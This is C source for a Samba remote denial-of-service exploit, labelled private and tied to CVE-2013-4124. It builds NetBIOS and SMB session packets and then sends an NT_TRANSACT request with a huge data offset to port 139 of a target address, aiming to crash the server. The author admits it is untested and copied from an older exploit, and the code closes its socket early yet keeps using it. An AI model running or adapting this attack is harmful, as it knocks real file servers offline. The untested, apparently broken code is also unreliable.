/*

    !!!!! PRIVATE !!!!! PRIVATE !!!!! PRIVATE !!!!! PRIVATE !!!!!

	CVE-2013-4124 samba remote dos private exploit

	
	./samba_nttrans_exploit [target ip addr]

    * ... test ...:
      I didn't test for the exploit, I 
      copied another samba nttrans exploit 
      in 2003 that http://www.securiteam.co
      m/exploits/5TP0M2AAKS.html. It should 
      be works!
      
      the exploit send malformed nttrans 
      smb packet with large value of data 
      offset to cause integer wrap in the 
      vulnerable function of read_nttrns_ea_list

      I left an article that analyzed it
    
    !!!!! PRIVATE !!!!! PRIVATE !!!!! PRIVATE !!!!! PRIVATE !!!!!


	x90c

*/

#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <errno.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <ctype.h>
#include <signal.h>

typedef unsigned char uint8;
typedef unsigned short uint16;
typedef unsigned long uint32;

struct variable_data_header
{ uint8 wordcount, bytecount[2];
};

struct nbt_session_header
{ uint8 type, flags, len[2];
};

struct smb_base_header
{ uint8 protocol[4], command, errorclass, reserved, errorcode[2];
 uint8 flags;
 uint8 flags2[2], reserved2[12], tid[2], pid[2], uid[2], mid[2];
};

struct negprot_reply_header
{ uint8 wordcount;
 uint8 dialectindex[2];
 uint8 securitymode;
 uint16 maxmpxcount, maxvccount;
 uint32 maxbufsize, maxrawsize, sessionid, capabilities, timelow, timehigh;
 uint16 timezone;
 uint8 keylen;
 uint16 bytecount;
};

struct sesssetupx_request_header
{ uint8 wordcount, command, reserved;
 uint8 offset[2], maxbufsize[2], maxmpxcount[2], vcnumber[2];
 uint8 sessionid[4];
 uint8 ipasswdlen[2], passwdlen[2];
 uint8 reserved2[4], capabilities[4];
};

struct sesssetupx_reply_header
{ uint8 wordcount, xcommand, xreserved, xoffset[2], action[2], bytecount[2];
};

struct tconx_request_header
{ uint8 wordcount, xcommand, xreserved, xoffset[2], flags[2], passwdlen[2], bytecount[2];
};

struct tconx_reply_header
{ uint8 wordcount, xcommand, xreserved, xoffset[2], supportbits[2], bytecount[2];
};

struct nttrans_primary_request_header
{ 
	uint8 wordcount; 
	uint8 maxsetupcount; 
	uint8 flags[2];
	uint8 totalparamcount[4]; 
	uint8 totaldatacount[4];
	uint8 maxparamcount[4];
	uint8 maxdatacount[4];
    uint8 paramcount[4];
	uint8 paramoffset[4];
	uint8 datacount[4];
	uint8 dataoffset[4];	// XXXX 0xf000000
	uint8 setupcount; 
	uint8 function[2]; 
	uint8 bytecount[2];
};

#define SMB_NEGPROT 0x72
#define SMB_SESSSETUPX 0x73
#define SMB_TCONX 0x75
#define SMB_TRANS2 0x32
#define SMB_NTTRANS 0xA0
#define SMB_NTTRANSCREATE 0x01
#define SMB_TRANS2OPEN 0x00
#define SMB_SESSIONREQ 0x81
#define SMB_SESSION 0x00

uint32 sessionid, PARAMBASE = 0x81c0000;
char *tconx_servername;
int tid, pid, uid;

#define STACKBOTTOM 0xbfffffff
#define STACKBASE 0xbfffd000
#define TOTALCOUNT ((int)(STACKBOTTOM - STACKBASE))

char *netbios_encode_name(char *name, int type)
{ char plainname[16], c, *encoded, *ptr;
 int i, len = strlen(name);
 if ((encoded = malloc(34)) == NULL)
 { fprintf(stderr, "malloc() failed\n");
 exit(-1);
 }
 ptr = encoded;
 strncpy(plainname, name, 15);
 *ptr++ = 0x20;
 for (i = 0; i < 16; i++)
 { if (i == 15) c = type;
 else 
 { if (i < len) c = toupper(plainname[i]);
  else c = 0x20;
 }
 *ptr++ = (((c >> 4) & 0xf) + 0x41);
 *ptr++ = ((c & 0xf) + 0x41);
 }
 *ptr = '\0';
 return encoded;
}

void construct_nbt_session_header(char *ptr, uint8 type, uint8 flags, uint32 len)
{ struct nbt_session_header *nbt_hdr = (struct nbt_session_header *)ptr;
 uint16 nlen;

// geen idee of dit de juiste manier is, maar 't lijkt wel te werken ..
 if (len > 65535) nlen = 65535;
 else nlen = htons(len);

 memset((void *)nbt_hdr, '\0', sizeof (struct nbt_session_header));
 
 nbt_hdr->type = type;
 nbt_hdr->flags = flags;
 memcpy(&nbt_hdr->len, &nlen, sizeof (uint16));
}

// caller zorgt voor juiste waarde van ptr.
void construct_smb_base_header(char *ptr, uint8 command, uint8 flags, uint16 flags2, uint16 tid, uint16 pid, 
 uint16 uid, uint16 mid)
{ struct smb_base_header *base_hdr = (struct smb_base_header *)ptr;

 memset(base_hdr, '\0', sizeof (struct smb_base_header));

 memcpy(base_hdr->protocol, "\xffSMB", 4);

 base_hdr->command = command;
 base_hdr->flags = flags;

 memcpy(&base_hdr->flags2, &flags2, sizeof (uint16));
 memcpy(&base_hdr->tid, &tid, sizeof (uint16));
 memcpy(&base_hdr->pid, &pid, sizeof (uint16));
 memcpy(&base_hdr->uid, &uid, sizeof (uint16));
 memcpy(base_hdr->mid, &mid, sizeof (uint16));
}

void construct_sesssetupx_header(char *ptr)
{ struct sesssetupx_request_header *sx_hdr = (struct sesssetupx_request_header *)ptr;
 uint16 maxbufsize = 0xffff, maxmpxcount = 2, vcnumber = 31257, pwdlen = 0;
 uint32 capabilities = 0x50;

 memset(sx_hdr, '\0', sizeof (struct sesssetupx_request_header));

 sx_hdr->wordcount = 13;
 sx_hdr->command = 0xff;
 memcpy(&sx_hdr->maxbufsize, &maxbufsize, sizeof (uint16));
 memcpy(&sx_hdr->vcnumber, &vcnumber, sizeof (uint16));
 memcpy(&sx_hdr->maxmpxcount, &maxmpxcount, sizeof (uint16));
 memcpy(&sx_hdr->sessionid, &sessionid, sizeof (uint32));
 memcpy(&sx_hdr->ipasswdlen, &pwdlen, sizeof (uint16));
 memcpy(&sx_hdr->passwdlen, &pwdlen, sizeof (uint16));
 memcpy(&sx_hdr->capabilities, &capabilities, sizeof (uint32));
}

/*
struct tconx_request_header
{ uint8 wordcount, xcommand, xreserved, xoffset[2], flags[2], passwdlen[2], bytecount[2];
 -- uint16 bytecount geeft lengte van volgende fields aan: char password[], path[], service[];
}; */
void construct_tconx_header(char *ptr)
{ struct tconx_request_header *tx_hdr = (struct tconx_request_header *)ptr;
 uint16 passwdlen = 1, bytecount;
 char *data;

 memset(tx_hdr, '\0', sizeof (struct tconx_request_header));

 bytecount = strlen(tconx_servername) + 15; 

 if ((data = malloc(bytecount)) == NULL)
 { fprintf(stderr, "malloc() failed, aborting!\n");
 exit(-1);
 }
 memcpy(data, "\x00\x5c\x5c", 3);
 memcpy(data + 3, tconx_servername, strlen(tconx_servername));
 memcpy(data + 3 + strlen(tconx_servername), "\x5cIPC\x24\x00\x3f\x3f\x3f\x3f\x3f\x00", 12);

 tx_hdr->wordcount = 4;
 tx_hdr->xcommand = 0xff;

 memcpy(&tx_hdr->passwdlen, &passwdlen, sizeof (uint16));
 memcpy(&tx_hdr->bytecount, &bytecount, sizeof (uint16));

 memcpy(ptr + sizeof (struct tconx_request_header), data, bytecount);
}

void nbt_session_request(int fd, char *clientname, char *servername)
{ 
	char *cn, *sn;
	char packet[sizeof (struct nbt_session_header) + (34 * 2)];

	construct_nbt_session_header(packet, SMB_SESSIONREQ, 0, sizeof (packet) - sizeof (struct nbt_session_header));

	tconx_servername = servername;

	sn = netbios_encode_name(servername, 0x20);
	cn = netbios_encode_name(clientname, 0x00);

	memcpy(packet + sizeof (struct nbt_session_header), sn, 34);
	memcpy(packet + (sizeof (struct nbt_session_header) + 34), cn, 34);

	write(fd, packet, sizeof (packet));
	close(fd);

	free(cn);
	free(sn);
}

void process_nbt_session_reply(int fd)
{ struct nbt_session_header nbt_hdr;
 char *errormsg;
 uint8 errorcode;
 int size, len = 0;

 if ((size = read(fd, &nbt_hdr, sizeof (nbt_hdr))) == -1)
 { close(fd);
 fprintf(stderr, "read() failed, reason: '%s' (code %i)\n", strerror(errno), errno); 
 exit(-errno);
 }
 if (size != sizeof (nbt_hdr))
 { close(fd);
 fprintf(stderr, "read() a broken packet, aborting.\n"); 
 exit(-1);
 }
 memcpy(&len, &nbt_hdr.len, sizeof (uint16));

 if (len)
 { read(fd, (void *)&errorcode, 1); 
 close(fd);
 switch (errorcode)
 { case 0x80 : errormsg = "Not listening on called name"; break;
  case 0x81 : errormsg = "Not listening for calling name"; break;
  case 0x82 : errormsg = "Called name not present"; break;
  case 0x83 : errormsg = "Called name present, but insufficient resources"; break;
  case 0x8f : errormsg = "Unspecified error"; break;
  default : errormsg = "Unspecified error (unknown error code received!)"; break;
 }
 fprintf(stderr, "session request denied, reason: '%s' (code %i)\n", errormsg, errorcode);
 exit(-1);
 }
 printf("session request granted\n");
}

void negprot_request(int fd)
{ struct variable_data_header data;
 char dialects[] = "\x2PC NETWORK PROGRAM 1.0\x0\x2MICROSOFT NETWORKS 1.03\x0\x2MICROSOFT NETWORKS 3.0\x0\x2LANMAN1.0\x0" \
 "\x2LM1.2X002\x0\x2Samba\x0\x2NT LANMAN 1.0\x0\x2NT LM 0.12\x0\x2""FLATLINE'S KWAADWAAR"; 
 char packet[sizeof (struct nbt_session_header) + sizeof (struct smb_base_header) + sizeof (data) + sizeof (dialects)];
 int dlen = htons(sizeof (dialects));

 memset(&data, '\0', sizeof (data));
 construct_nbt_session_header(packet, SMB_SESSION, 0, sizeof (packet) - sizeof (struct nbt_session_header));
 pid = getpid();
 construct_smb_base_header(packet + sizeof (struct nbt_session_header), SMB_NEGPROT, 8, 1, 0, pid, 0, 1);

 memcpy(&data.bytecount, &dlen, sizeof (uint16));

 memcpy(packet + (sizeof (struct nbt_session_header) + sizeof (struct smb_base_header)), &data, sizeof (data));
 memcpy(packet + (sizeof (struct nbt_session_header) + sizeof (struct smb_base_header) + sizeof (data)), 
 dialects, sizeof (dialects));

 if (write(fd, packet, sizeof (packet)) == -1)
 { close(fd);
 fprintf(stderr, "write() failed, reason: '%s' (code %i)\n", strerror(errno), errno); 
 exit(-errno);
 }
}

void process_negprot_reply(int fd)
{ struct nbt_session_header *nbt_hdr;
 struct smb_base_header *base_hdr;
 struct negprot_reply_header *np_reply_hdr;
 char packet[1024];
 int size;
 uint16 pid_reply;

 nbt_hdr = (struct nbt_session_header *)packet;
 base_hdr = (struct smb_base_header *)(packet + sizeof (struct nbt_session_header));
 np_reply_hdr = (struct negprot_reply_header *)(packet + (sizeof (struct nbt_session_header) + 
 sizeof (struct smb_base_header)));

 if ((size = read(fd, packet, sizeof (packet))) == -1)
 { close(fd);
 fprintf(stderr, "read() failed, reason: '%s' (code %i)\n", strerror(errno), errno); 
 exit(-errno);
 }

 memcpy(&pid_reply, &base_hdr->pid, sizeof (uint16));
 memcpy(&sessionid, &np_reply_hdr->sessionid, sizeof (uint32));
 if (base_hdr->command != SMB_NEGPROT || np_reply_hdr->wordcount != 17 || pid_reply != pid)
 { close(fd);
 fprintf(stderr, "protocol negotiation failed\n");
 exit(-1);
 }

 printf("protocol negotiation complete\n");
}

void sesssetupx_request(int fd)
{ uint8 data[] = "\x12\x0\x0\x0\x55\x6e\x69\x78\x00\x53\x61\x6d\x62\x61";
 char packet[sizeof (struct nbt_session_header) + sizeof (struct smb_base_header) + 
 sizeof (struct sesssetupx_request_header) + sizeof (data)];
 int size;

 construct_nbt_session_header(packet, SMB_SESSION, 0, sizeof (packet) - sizeof (struct nbt_session_header));
 construct_smb_base_header(packet + sizeof (struct nbt_session_header), SMB_SESSSETUPX, 8, 1, 0, pid, 0, 1);
 construct_sesssetupx_header(packet + sizeof (struct nbt_session_header) + sizeof (struct smb_base_header));
 memcpy(packet + sizeof (struct nbt_session_header) + sizeof (struct smb_base_header) + 
 sizeof (struct sesssetupx_request_header), &data, sizeof (data));

 if ((size = write(fd, packet, sizeof (packet))) == -1)
 { close(fd);
 fprintf(stderr, "write() failed, reason: '%s' (code %i)\n", strerror(errno), errno); 
 exit(-errno);
 }
 if (size != sizeof (packet))
 { close(fd);
 fprintf(stderr, "couldn't write entire packet, aborting!\n");
 exit(-1);
 }
}

void process_sesssetupx_reply(int fd)
{ struct nbt_session_header *nbt_hdr;
 struct smb_base_header *base_hdr;
 struct sesssetupx_reply_header *sx_hdr;
 char packet[1024];
 int size, len;

 if ((size = read(fd, packet, sizeof (packet))) == -1)
 { close(fd);
 fprintf(stderr, "read() failed, reason: '%s' (code %i)\n", strerror(errno), errno); 
 exit(-errno);
 }

 nbt_hdr = (struct nbt_session_header *)packet;
 base_hdr = (struct smb_base_header *)(packet + sizeof (struct nbt_session_header));
 sx_hdr = (struct sesssetupx_reply_header *)(packet + sizeof (struct nbt_session_header) + sizeof (struct smb_base_header));

 memcpy(&len, &nbt_hdr->len, sizeof (uint16));
 memcpy(&uid, &base_hdr->uid, sizeof (uint16));

 if (sx_hdr->xcommand != 0xff && sx_hdr->wordcount != 3)
 { close(fd);
 fprintf(stderr, "session setup failed\n");
 exit(-1);
 }

 printf("session setup complete, got assigned uid %i\n", uid);
}

void tconx_request(int fd)
{ 
 char *packet;
 int size, pktsize = sizeof (struct nbt_session_header) + sizeof (struct smb_base_header) +
 sizeof (struct tconx_request_header) + strlen(tconx_servername) + 15;

 if ((packet = malloc(pktsize)) == NULL)
 { close(fd);
 fprintf(stderr, "malloc() failed, aborting!\n");
 exit(-1);
 }

 construct_nbt_session_header(packet, SMB_SESSION, 0, pktsize - sizeof (struct nbt_session_header));
 construct_smb_base_header(packet + sizeof (struct nbt_session_header), SMB_TCONX, 8, 1, 0, pid, uid, 1);
 construct_tconx_header(packet + sizeof (struct nbt_session_header) + sizeof (struct smb_base_header));

 if ((size = write(fd, packet, pktsize)) == -1)
 { close(fd);
 fprintf(stderr, "write() failed, reason: '%s' (code %i)\n", strerror(errno), errno); 
 exit(-errno);
 }

 free(packet);

 if (size != pktsize)
 { close(fd);
 fprintf(stderr, "couldn't write entire packet, aborting!\n");
 exit(-1);
 } 
}

void process_tconx_reply(int fd)
{ struct nbt_session_header *nbt_hdr;
 struct smb_base_header *base_hdr;
 struct tconx_reply_header *tx_hdr;
 char packet[1024];
 int size, bytecount;
 
 if ((size = read(fd, packet, sizeof (packet))) == -1)
 { close(fd);
 fprintf(stderr, "read() failed, reason: '%s' (code %i)\n", strerror(errno), errno);
 exit(-errno);
 }

 nbt_hdr = (struct nbt_session_header *)packet;
 base_hdr = (struct smb_base_header *)(packet + sizeof (struct nbt_session_header));
 tx_hdr = (struct tconx_reply_header *)(packet + sizeof (struct nbt_session_header) + sizeof (struct smb_base_header));

 memcpy(&tid, &base_hdr->tid, sizeof (uint16));
 memcpy(&bytecount, &tx_hdr->bytecount, sizeof (uint16));

 printf("tree connect complete, got assigned tid %i\n", tid);
}

void nttrans_request(int fd) { 
	// packet = nbt session header + smb base header + nttrans header!
	char packet[sizeof (struct nbt_session_header) + 
				sizeof (struct smb_base_header) + 
				sizeof (struct nttrans_primary_request_header)];
	struct nttrans_primary_request_header nttrans_hdr;	// nttrans header!
	int size=0;
	int function = SMB_NTTRANSCREATE;	// NTTRANSCREATE!
	int totalparamcount = TOTALCOUNT;
	int totaldatacount = 0;
	uint8 setupcount = 0;

	memset(&nttrans_hdr, 0, sizeof nttrans_hdr);

	// construct nbt session header
	construct_nbt_session_header(packet, SMB_SESSION, 0, sizeof (packet) - sizeof (struct nbt_session_header));
	// construct smb base header
	construct_smb_base_header(packet + sizeof (struct nbt_session_header), SMB_NTTRANS, 8, 1, tid, pid, uid, 1);

	// construct nttrans header
	nttrans_hdr.paramoffset[0] = '\x00';
	nttrans_hdr.paramoffset[1] = '\x00';
	nttrans_hdr.paramoffset[2] = '\x10';
	nttrans_hdr.paramoffset[3] = '\xff';
	nttrans_hdr.dataoffset[0] = '\x00';	// XXX data offset 0xff100000 to integer wrap
	nttrans_hdr.dataoffset[1] = '\x00';	//		the offset exploits the security bug of CVE-2013-4124
	nttrans_hdr.dataoffset[2] = '\x10';	//      samba remote dos
	nttrans_hdr.dataoffset[3] = '\xff';

	nttrans_hdr.wordcount = 19 + setupcount;
	memcpy(&nttrans_hdr.function, &function, sizeof (uint16));
	memcpy(&nttrans_hdr.totalparamcount, &totalparamcount, sizeof (uint32));
	memcpy(&nttrans_hdr.totaldatacount, &totaldatacount, sizeof (uint32));
	memcpy(packet + sizeof (struct nbt_session_header) + sizeof (struct smb_base_header), &nttrans_hdr, sizeof nttrans_hdr);

	// send samba packet!
	size = write(fd, packet, sizeof (packet));
	close(fd);

}

static char banner[]={
"                                    ___    ___              \n" \
"                                   / _ \\  / _ \\           \n" \
"                            __  __| (_) || | | |  ___       \n" \
"                            \\ \\/ / \\__. || | | | / __|   \n" \
"                             >  <    / / | |_| || (__       \n" \
"                            /_/\\_\\  /_/   \\___/  \\___|  \n" \
};

int main(int argc, char *argv[]) {
	int fd;
	struct sockaddr_in s_in;
	char target_ip[16];
	int smb_port=139;
    

    printf("%s\n\nsamba nttrans reply exploit\n\n", banner);

	if(argc < 2){
		fprintf(stderr, "samba nttrans reply exploit Usage:\n\n./samba_exploit [target ip addr]\n\n");
		exit(-1);
	}

	strncpy(target_ip, argv[1], 16);
	
    memset(&s_in, 0, sizeof (s_in));
    s_in.sin_family = AF_INET;
    s_in.sin_port = htons(smb_port);	// samba port=139/tcp
    s_in.sin_addr.s_addr = inet_addr(target_ip);

    fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    connect(fd, (struct sockaddr *)&s_in, sizeof (s_in));

	// nbt(netbios over tcpip, nbtstat) session request
	nbt_session_request(fd, "BOSSA", "SAMBA");	// adjust computer names(clientname, servername)
    process_nbt_session_reply(fd);

	// protocol negotiation
    negprot_request(fd);
    process_negprot_reply(fd);
 
    // session setup
    sesssetupx_request(fd);	// setup request
    process_sesssetupx_reply(fd);	// setup reply

    // tree connection setup
    tconx_request(fd);
    process_tconx_reply(fd);

	// exploit!
    printf("[*] nttrans reply exploit!\n");
    nttrans_request(fd);

	close(fd);

	return 0;
}
